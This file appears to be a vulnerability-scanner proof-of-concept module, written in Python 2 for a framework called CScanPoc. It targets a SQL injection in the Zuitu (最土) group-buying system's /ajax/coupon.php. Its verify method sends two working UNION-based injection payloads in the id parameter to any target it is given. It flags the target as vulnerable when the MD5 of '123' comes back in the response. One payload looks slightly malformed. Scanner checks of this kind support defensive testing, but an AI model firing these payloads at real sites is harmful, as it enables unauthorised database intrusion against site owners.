# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '40ac52eb-162d-45b9-b1f4-309eac8b9bee'
    name = '最土团购系统通用注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-10-04'  # 漏洞公布时间
    desc = '''
        最土团购系统 /ajax/coupon.php 通用注入漏洞。
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/2245/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Zuitu(最土团购)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7031a149-d55a-4eb0-9346-3ab030727d7e'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payloads = ("/ajax/coupon.php?action=consume&secret=8&id=2%27)/**/and/**/1=2/**/union/**/select/**/1,2,0,4,5,6,concat(0x31,0x3a,md5(123),0x3amd5(123),0x3a,md5(123),md5(233)),8,9,10,11,9999999999,13,14,15,16%23",
                "ajax/coupon.php?action=consume&secret=8&id=2%27)/**/and/**/1=2/**/union/**/select/**/1,2,0,4,5,6,concat(0x31,0x3a,md5(123),0x3a,md5(123),0x3a,md5(123),0x3a),8,9,10,11,9999999999,13,14,15,16%23",    
                )
            for payload in payloads:
                url = arg + payload
                code, head, res, errcode,finalurl =  hh.http(url)
                if code == 200:
                    if '202cb962ac59075b964b07152d234b70' in res:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()